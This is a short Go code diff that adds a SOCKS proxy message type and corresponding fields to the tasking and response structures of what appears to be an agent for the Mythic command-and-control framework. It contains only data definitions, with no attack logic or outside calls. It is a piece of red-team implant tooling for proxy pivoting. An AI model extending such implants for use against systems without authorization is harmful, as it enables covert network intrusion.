@@ -133,6 +133,13 @@ type FileUploadMessageResponse struct {
 	TotalChunks int    `json:"total_chunks"`
 }
 
+// SocksMsg represents a single SOCKS proxy message exchanged with Mythic
+type SocksMsg struct {
+	ServerId uint32 `json:"server_id"`
+	Data     string `json:"data"`
+	Exit     bool   `json:"exit"`
+}
+
 // CommandResult represents the result of executing a command
 type CommandResult struct {
 	Output    string
@@ -160,8 +167,9 @@ type CheckinMessage struct {
 
 // TaskingMessage represents the message to get tasking
 type TaskingMessage struct {
-	Action      string `json:"action"`
-	TaskingSize int    `json:"tasking_size"`
+	Action      string     `json:"action"`
+	TaskingSize int        `json:"tasking_size"`
+	Socks       []SocksMsg `json:"socks,omitempty"`
 	// Add agent identification for checkin updates
 	PayloadUUID string `json:"uuid,omitempty"`
 	PayloadType string `json:"payload_type,omitempty"`
@@ -172,6 +180,7 @@ type TaskingMessage struct {
 type PostResponseMessage struct {
 	Action    string     `json:"action"`
 	Responses []Response `json:"responses"`
+	Socks     []SocksMsg `json:"socks,omitempty"`
 }
 
 // Command interface for all commands
